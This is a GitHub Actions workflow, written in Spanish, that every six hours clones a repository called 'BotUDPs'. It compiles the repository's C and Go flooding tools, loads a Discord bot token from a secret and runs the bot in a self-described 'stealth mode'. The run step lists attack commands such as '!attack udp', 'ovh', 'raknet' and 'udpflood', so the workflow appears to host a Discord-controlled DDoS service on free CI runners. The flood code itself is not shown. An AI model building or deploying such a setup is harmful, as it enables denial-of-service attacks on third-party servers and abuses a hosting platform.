name: DinDinDONBOT

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'  # Cada 6 horas

jobs:
  clone-compile-run:
    runs-on: ubuntu-latest
    
    steps:
    - name: üóëÔ∏è Limpiar directorio anterior
      run: |
        echo "Limpiando directorios anteriores..."
        rm -rf BotUDPs 2>/dev/null || true
    
    - name: üì• Clonar repositorio
      run: |
        echo "Clonando repositorio BotUDPs..."
        git clone https://github.com/zJonch14/BotUDPs.git
        
        if [ ! -d "BotUDPs" ]; then
          echo "ERROR: No se pudo clonar el repositorio"
          exit 1
        fi
        
        cd BotUDPs
        echo "‚úÖ Repositorio clonado en: $(pwd)"
        echo "üìÅ Contenido del repositorio:"
        ls -la
    
    - name: üêç Configurar Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: üîß Instalar herramientas esenciales
      run: |
        echo "Instalando herramientas necesarias..."
        sudo apt-get update
        sudo apt-get install -y build-essential gcc g++ make
        echo "‚úÖ Herramientas instaladas"
    
    - name: üì¶ Instalar discord.py
      run: |
        cd BotUDPs
        echo "Instalando discord.py..."
        pip install discord.py
        echo "‚úÖ discord.py instalado"
    
    - name: üõ†Ô∏è COMPILAR SOLO ARCHIVOS QUE EXISTEN
      run: |
        cd BotUDPs
        echo "========================================"
        echo "COMPILACI√ìN INTELIGENTE DE BINARIOS C"
        echo "========================================"
        
        echo "üìã Buscando archivos .c en el directorio..."
        
        # Encontrar TODOS los archivos .c que realmente existen
        c_files=$(find . -maxdepth 1 -name "*.c" -type f)
        
        if [ -z "$c_files" ]; then
          echo "‚ö†Ô∏è  No se encontraron archivos .c para compilar"
        else
          echo "‚úÖ Archivos .c encontrados:"
          echo "$c_files"
          echo ""
          
          compiled=0
          for c_file in $c_files; do
            # Obtener solo el nombre del archivo (sin ./)
            filename=$(basename "$c_file")
            binary="${filename%.c}"
            
            echo "üî® Compilando: $filename ‚Üí $binary"
            
            # Compilar cada archivo
            if gcc -O3 -pthread "$filename" -o "$binary" 2>/dev/null; then
              chmod +x "$binary"
              echo "  ‚úÖ $binary compilado exitosamente"
              ((compiled++))
            else
              echo "  ‚ö†Ô∏è  Error compilando $binary (posiblemente necesita librer√≠as adicionales)"
            fi
            echo ""
          done
          
          echo "========================================"
          echo "RESUMEN DE COMPILACI√ìN:"
          echo "  ‚úÖ $compiled binarios compilados"
          echo ""
          echo "üìÇ EJECUTABLES DISPONIBLES:"
          find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read exe; do
            echo "  ‚úì $(basename "$exe")"
          done || echo "  Ning√∫n ejecutable encontrado"
        fi
        
        echo "========================================"
    
    - name: ü¶æ Configurar Go (solo si hay archivos .go)
      run: |
        cd BotUDPs
        
        # Verificar si hay archivos .go
        if ls *.go >/dev/null 2>&1; then
          echo "ü¶æ Configurando Go para scripts .go..."
          
          # Instalar Go si no est√°
          if ! command -v go &> /dev/null; then
            echo "Instalando Go..."
            sudo apt-get install -y golang-go
          fi
          
          # Configurar m√≥dulo Go
          if [ ! -f "go.mod" ]; then
            go mod init bot-udps 2>/dev/null || true
          fi
          
          # Intentar instalar dependencias (opcional, no cr√≠tico)
          echo "Configurando dependencias Go (opcional)..."
          go get github.com/sandertv/go-raknet 2>/dev/null || echo "‚ö†Ô∏è  go-raknet opcional"
          
          echo "‚úÖ Go configurado"
        else
          echo "‚ö†Ô∏è  No se encontraron archivos .go, omitiendo configuraci√≥n de Go"
        fi
    
    - name: üîê Configurar token DESDE SECRET KEYS
      env:
        DISCORD_TOKEN: ${{ secrets.KEYS }}
      run: |
        cd BotUDPs
        echo "========================================"
        echo "CONFIGURANDO TOKEN DESDE SECRET 'KEYS'"
        echo "========================================"
        
        if [ -z "$DISCORD_TOKEN" ]; then
          echo ""
          echo "‚ùå ERROR: NO SE ENCONTR√ì EL SECRET 'KEYS'"
          echo ""
          echo "Para solucionar:"
          echo "1. Settings ‚Üí Secrets and variables ‚Üí Actions"
          echo "2. New repository secret"
          echo "3. Nombre: KEYS"
          echo "4. Valor: [TU TOKEN DE BOT DE DISCORD]"
          echo "5. Add secret"
          echo ""
          exit 1
        fi
        
        # Guardar token
        echo "$DISCORD_TOKEN" > token.txt
        
        # Verificar
        if [ -f "token.txt" ] && [ -s "token.txt" ]; then
          echo "‚úÖ Token guardado en token.txt"
          echo "   Tama√±o: $(wc -c < token.txt) caracteres"
        else
          echo "‚ùå ERROR: No se pudo crear token.txt"
          exit 1
        fi
        
        echo "========================================"
    
    - name: üìã Verificar estado final
      run: |
        cd BotUDPs
        echo "========================================"
        echo "VERIFICACI√ìN FINAL"
        echo "========================================"
        echo "üìÇ Directorio: $(pwd)"
        echo ""
        
        echo "üìÑ Archivos cr√≠ticos:"
        if [ -f "bot.py" ]; then
          echo "  ‚úÖ bot.py"
        else
          echo "  ‚ùå bot.py (FALTA)"
        fi
        
        if [ -f "token.txt" ]; then
          echo "  ‚úÖ token.txt"
        else
          echo "  ‚ùå token.txt (FALTA)"
        fi
        echo ""
        
        echo "‚öôÔ∏è Ejecutables disponibles:"
        executables=$(find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" 2>/dev/null | wc -l)
        if [ "$executables" -gt 0 ]; then
          find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read exe; do
            size=$(stat -c%s "$exe" 2>/dev/null || echo "?")
            echo "  ‚úì $(basename "$exe") (${size} bytes)"
          done
        else
          echo "  ‚ö†Ô∏è  No hay ejecutables compilados"
        fi
        echo ""
        
        echo "ü¶æ Scripts Go:"
        if ls *.go >/dev/null 2>&1; then
          ls *.go | while read go_file; do
            echo "  ‚úì $go_file"
          done
        else
          echo "  ‚ö†Ô∏è  No hay scripts Go"
        fi
        
        echo ""
        echo "‚úÖ Verificaci√≥n completada"
        echo "========================================"
    
    - name: üöÄ EJECUTAR bot.py
      run: |
        cd BotUDPs
        echo "========================================"
        echo "üöÄ INICIANDO BOT UDP"
        echo "========================================"
        echo "üìÖ Hora de inicio: $(date)"
        echo "üîß M√©todos disponibles seg√∫n archivos:"
        echo ""
        
        # Mostrar m√©todos basados en archivos existentes
        if [ -f "udp" ] || [ -f "udp.c" ]; then echo "  !attack udp"; fi
        if [ -f "udphex" ] || [ -f "udphex.c" ]; then echo "  !attack udphex"; fi
        if [ -f "udppps" ] || [ -f "udppps.c" ]; then echo "  !attack udppps"; fi
        if [ -f "ovh" ] || [ -f "ovh.c" ]; then echo "  !attack ovh"; fi
        if [ -f "udpflood.go" ]; then echo "  !attack udpflood"; fi
        if [ -f "raknet.go" ]; then echo "  !attack raknet"; fi
        if [ -f "udppayload" ] || [ -f "udppayload.c" ]; then echo "  !attack udppayload"; fi
        
        echo ""
        echo "‚ö†Ô∏è  MODO SIGILOSO: 0 mensajes en Discord"
        echo "üìù Logs solo en esta consola"
        echo "‚è∞ Duraci√≥n: Hasta l√≠mite de GitHub (~6h)"
        echo "========================================"
        
        # Verificaciones finales
        if [ ! -f "bot.py" ]; then
          echo "‚ùå ERROR: bot.py no encontrado"
          exit 1
        fi
        
        if [ ! -f "token.txt" ] || [ ! -s "token.txt" ]; then
          echo "‚ùå ERROR: token.txt inv√°lido"
          exit 1
        fi
        
        echo ""
        echo "‚úÖ INICIANDO EJECUCI√ìN..."
        echo ""
        
        # Ejecutar bot (se detendr√° solo cuando GitHub lo cancele)
        python3 bot.py
        
        echo ""
        echo "========================================"
        echo "BOT DETENIDO"
        echo "‚è∞ Hora: $(date)"
        echo "========================================"
